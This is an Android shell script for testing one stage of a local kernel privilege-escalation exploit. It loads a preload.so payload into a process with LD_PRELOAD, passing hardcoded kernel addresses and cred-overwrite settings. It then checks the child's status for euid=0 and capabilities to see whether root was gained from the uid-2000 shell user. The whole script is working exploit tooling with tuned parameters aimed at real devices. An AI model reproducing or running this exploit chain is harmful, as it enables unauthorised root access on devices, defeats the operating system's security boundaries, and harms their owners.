#!/system/bin/sh
# C-stage fork-mode isolation test (2026-08-31)
#
# Purpose:
#   Current C1 rounds always use external mode (PSELECT_TASK=<prev R child>).
#   C has 0/6 while R (fork mode) has 7/7.  This script runs stage=C in the
#   SAME fork mode as R (no PSELECT_TASK), writing task+0x780 cred on a
#   freshly forked child.  It isolates whether the C miss is caused by
#   external mode / stack-layout difference or by the 0x778 pc geometry.
#
# Expected outcome if C geometry works:
#   mt49_child_status.txt shows "euid=0" while "CapEff=0000000000000000".
#   Under PSELECT_PTR_STRICT AND-gate (CapEff full AND euid==0) this is a
#   half-state and does NOT trigger setresuid/commit_creds -> safe.
#
# Expected outcome if C geometry is broken:
#   status remains uid=2000 euid=2000 CapEff=0 root_seen=0.
#
# Run via rish/Shizuku after deploying mt67 (or current preload.so).
LOG=/data/local/tmp/cfork_log.txt
echo "=== CFORK start $(date +%H:%M:%S) ===" > $LOG
am kill-all 2>/dev/null
rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt
timeout 250 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
  PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
  PSELECT_NO_CANARY=1 \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 \
  > /data/local/tmp/Cfork.out 2>&1
echo "CFORK rc=$? boot=$(cat /proc/sys/kernel/random/boot_id) enforce=$(getenforce)" >> $LOG
echo "--- status ---" >> $LOG
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null >> $LOG
echo "--- C fork markers ---" >> $LOG
grep -a "mt33: child pid\|mt49: external\|mt48: PTR stage=C\|mt25: futex trigger\|mt19b\|pselect returned\|euid=0\|root_seen=" /data/local/tmp/Cfork.out 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | head -30 >> $LOG
cat $LOG
